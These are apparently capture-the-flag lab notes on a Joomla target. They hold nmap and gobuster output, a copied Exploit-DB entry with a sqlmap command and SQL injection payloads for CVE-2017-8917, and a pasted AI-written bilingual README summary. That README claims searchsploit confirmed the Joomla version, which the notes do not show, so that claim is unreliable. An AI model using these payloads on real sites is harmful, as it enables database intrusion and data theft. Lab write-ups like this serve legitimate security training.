# daily-bugle-ctf-notes


## nmap
root@ip-10-49-108-103:~# nmap --min-rate 5000 -T4 10.49.190.46
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-06 02:53 GMT  
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers  
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers  
Nmap scan report for 10.49.134.85  
Host is up (0.00043s latency).  
Not shown: 997 closed ports  
PORT     STATE SERVICE  
22/tcp   open  ssh  
80/tcp   open  http  
3306/tcp open  mysql  

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds  




root@ip-10-49-108-103:~# gobuster dir -u http://10.49.190.46 -w /usr/share/wordlists/dirb/common.txt  

Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  

[+] Url:                     http://10.49.190.46
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Timeout:                 10s  

Starting gobuster in directory enumeration mode  

/.hta                 (Status: 403) [Size: 206]  
/.htpasswd            (Status: 403) [Size: 211]  
/.htaccess            (Status: 403) [Size: 211]  
/administrator        (Status: 301) [Size: 242]   
/bin                  (Status: 301) [Size: 232]  
/cache                (Status: 301) [Size: 234] 
/cgi-bin/             (Status: 403) [Size: 210]  
/components           (Status: 301) [Size: 239]   
/images               (Status: 301) [Size: 235] 
/includes             (Status: 301) [Size: 237]   
/language             (Status: 301) [Size: 237]  
/layouts              (Status: 301) [Size: 236]   
/libraries            (Status: 301) [Size: 238]   
/index.php            (Status: 200) [Size: 9278]  

/media                (Status: 301) [Size: 234]   
/modules              (Status: 301) [Size: 236]  
/plugins              (Status: 301) [Size: 236]  
/robots.txt           (Status: 200) [Size: 836]  
/templates            (Status: 301) [Size: 238]  
/tmp                  (Status: 301) [Size: 232]  
Progress: 4614 / 4615 (99.98%)  

## enumeration

firefoxで10.49.190.46/administratorを調べるとこんな画面が出てきた。
<img width="1221" height="613" alt="image" src="https://github.com/user-attachments/assets/cefac186-36f1-43c8-8ece-35b1bd307b48" />

`10.49.190.46robots.txt`を調べる  
If the Joomla site is installed within a folder     
eg www.example.com/joomla/ then the robots.txt file  
MUST be moved to the site root  
eg www.example.com/robots.txt  
AND the joomla folder name MUST be prefixed to all of the  
paths.  
eg the Disallow rule for the /administrator/ folder MUST  
be changed to read  
Disallow: /joomla/administrator/  

For more information about the robots.txt standard, see:  
http://www.robotstxt.org/orig.html  

For syntax checking, see:  
http://tool.motoricerca.info/robots-checker.phtml  

User-agent: *  
Disallow: /administrator/  
Disallow: /bin/  
Disallow: /cache/  
Disallow: /cli/  
Disallow: /components/  
Disallow: /includes/  
Disallow: /installation/  
Disallow: /language/  
Disallow: /layouts/  
Disallow: /libraries/  



## ssh 
root@ip-10-49-108-103:~# nmap -p22 --script ssh2-enum-algos 10.49.190.46
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-06 03:22 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.49.190.46
Host is up (0.0016s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh2-enum-algos: 
|   kex_algorithms: (12)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group-exchange-sha1
|       diffie-hellman-group14-sha256
|       diffie-hellman-group14-sha1
|       diffie-hellman-group1-sha1
|   server_host_key_algorithms: (5)
|       ssh-rsa
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (12)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|       aes128-cbc
|       aes192-cbc
|       aes256-cbc
|       blowfish-cbc
|       cast128-cbc
|       3des-cbc
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
root@ip-10-49-108-103:~# 



設問でWhat is the Joomla version?ときかれていたのでjoomraを調べた。



root@ip-10-49-108-103:~# `searchsploit joomla 3.7.`
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection    | php/webapps/42033.txt
Joomla! Component ARI Quiz 3.7.4 - SQL Inject | php/webapps/46769.txt
Joomla! Component Easydiscuss < 4.0.21 - Cros | php/webapps/43488.txt
Joomla! Component Quiz Deluxe 3.7.4 - SQL Inj | php/webapps/42589.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
root@ip-10-49-108-103:~# `searchsploit -m 42033.txt`
  Exploit: Joomla! 3.7.0 - 'com_fields' SQL Injection
      URL: https://www.exploit-db.com/exploits/42033
     Path: /opt/exploitdb/exploits/php/webapps/42033.txt
    Codes: CVE-2017-8917
 Verified: False
File Type: ASCII text
Copied to: /root/42033.txt


root@ip-10-49-108-103:~# `cat 42033.txt`
#Exploit Title: Joomla 3.7.0 - Sql Injection
 Date: 05-19-2017
 Exploit Author: Mateus Lino
#Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
#Vendor Homepage: https://www.joomla.org/
#Version: = 3.7.0
#Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
#CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)
SQL
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)root@ip-10-49-108-103:~# 


## SQLmap

了解、和志。  
GitHub の README を **日本語版 + 英語版の二言語構成**でまとめ直したよ。  
そのままコピペで README.md に使えるようにしてある。

---

# 📰 Daily Bugle CTF – Enumeration Report  
（**English + 日本語**）

---

# 🇺🇸 **English Version**

## 📌 Overview
This repository contains my enumeration notes and findings during the **Daily Bugle CTF** challenge.  
The target host exposed a Joomla-based web application, which led to identifying a known SQL injection vulnerability in Joomla 3.7.0.

---

## 🔎 1. Nmap Scan

### Command
```bash
nmap --min-rate 5000 -T4 10.49.190.46
```

### Results
| Port | State | Service |
|------|--------|----------|
| 22/tcp | open | ssh |
| 80/tcp | open | http |
| 3306/tcp | open | mysql |

---

## 📂 2. Directory Enumeration (Gobuster)

### Command
```bash
gobuster dir -u http://10.49.190.46 -w /usr/share/wordlists/dirb/common.txt
```

### Key Findings
- `/administrator` (Joomla admin panel)
- `/components`
- `/modules`
- `/plugins`
- `/templates`
- `/robots.txt`
- `/index.php` (200 OK)

---

## 🔐 3. Joomla Administrator Panel
Accessing:

```
http://10.49.190.46/administrator
```

Displayed the Joomla login page.

---

## 🤖 4. robots.txt Investigation

```
http://10.49.190.46/robots.txt
```

Contains Joomla default disallow rules:

```
Disallow: /administrator/
Disallow: /components/
Disallow: /includes/
Disallow: /libraries/
```

---

## 🔐 5. SSH Algorithm Enumeration

### Command
```bash
nmap -p22 --script ssh2-enum-algos 10.49.190.46
```

SSH supports modern algorithms.  
Web exploitation is prioritized.

---

## 🧩 6. Joomla Version Identification (Searchsploit)

### Command
```bash
searchsploit joomla 3.7.
```

### Relevant Vulnerability
- **Joomla! 3.7.0 – com_fields SQL Injection (CVE-2017-8917)**  
  Path: `php/webapps/42033.txt`

### PoC Example
```bash
sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

### ✔ Answer to the CTF question  
**Joomla version = 3.7.0**

---

## 🏁 Conclusion
- Target runs Joomla CMS  
- Directory enumeration confirmed typical Joomla structure  
- robots.txt reinforced Joomla presence  
- Searchsploit revealed **Joomla 3.7.0** with a known SQLi vulnerability  

---

# 🇯🇵 **日本語版**

## 📌 概要
このリポジトリは、**Daily Bugle CTF** における初期調査（Enumeration）の結果をまとめたものです。  
ターゲットホストは Joomla ベースの Web アプリケーションを公開しており、調査の結果 **Joomla 3.7.0 の既知 SQL インジェクション脆弱性** を特定しました。

---

## 🔎 1. Nmap スキャン

### コマンド
```bash
nmap --min-rate 5000 -T4 10.49.190.46
```

### 結果
| ポート | 状態 | サービス |
|--------|--------|-----------|
| 22/tcp | open | SSH |
| 80/tcp | open | HTTP |
| 3306/tcp | open | MySQL |

---

## 📂 2. ディレクトリ列挙（Gobuster）

### コマンド
```bash
gobuster dir -u http://10.49.190.46 -w /usr/share/wordlists/dirb/common.txt
```

### 主な発見
- `/administrator`（Joomla 管理画面）
- `/components`
- `/modules`
- `/plugins`
- `/templates`
- `/robots.txt`
- `/index.php`（200 OK）

---

## 🔐 3. Joomla 管理画面
アクセス：

```
http://10.49.190.46/administrator
```

Joomla のログイン画面が表示された。

---

## 🤖 4. robots.txt の調査

```
http://10.49.190.46/robots.txt
```

Joomla デフォルトの Disallow 設定が記載されていた：

```
Disallow: /administrator/
Disallow: /components/
Disallow: /includes/
Disallow: /libraries/
```

---

## 🔐 5. SSH アルゴリズム列挙

### コマンド
```bash
nmap -p22 --script ssh2-enum-algos 10.49.190.46
```

SSH は安全な暗号スイートを使用しており、  
Web 側の攻撃を優先する判断となった。

---

## 🧩 6. Joomla バージョン特定（Searchsploit）

### コマンド
```bash
searchsploit joomla 3.7.
```

### 関連脆弱性
- **Joomla! 3.7.0 – com_fields SQL Injection（CVE-2017-8917）**

### PoC（抜粋）
```bash
sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

### ✔ CTF の設問回答  
**Joomla のバージョン：3.7.0**

---

## 🏁 まとめ
- ターゲットは Joomla CMS を使用  
- ディレクトリ列挙で Joomla 構造を確認  
- robots.txt で Joomla であることを裏付け  
- Searchsploit により **Joomla 3.7.0 の SQLi 脆弱性** を特定  

---

必要なら README の最後に **攻撃フロー図** や **後半（SQLmap → Shell → PrivEsc → Flag）** も追加できるよ。
